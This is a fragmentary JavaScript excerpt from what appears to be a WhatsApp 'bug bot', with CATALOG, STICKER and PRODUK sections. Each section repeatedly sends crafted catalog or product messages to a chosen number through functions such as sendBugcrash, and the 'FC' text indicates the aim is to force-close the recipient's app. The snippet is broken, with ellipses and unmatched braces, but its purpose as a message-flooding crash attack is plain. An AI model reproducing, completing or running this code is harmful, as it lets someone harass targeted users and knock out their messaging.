CATALOG :
{
    ...
    "businessOwnerJid": "6281220616701@s.whatsapp.net",
    }
    }), { userJid: from, quoted: lep  })
    diablo.relayMessage(num, catalog.message, { messageId: catalog.key.id })
    await sleep(ms(waktu))
    }
    diablobotwhatsapp.reply(`SUKSES KIRIM JAN LUPA JEDANYA TOD `)
    }
    ...
    STICKER : 
    {
        ...
        await sleep(ms(waktu))
         ...
         PRODUK :
         {
            ...
            waktu = '3s'
            for (let i = 0; i < jumlah; i++) {
            sendBugcrash(num, 'FC YA CHUAKS', ppnyauser, "6281220616701@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
            await sleep(ms(waktu))
            }
            }
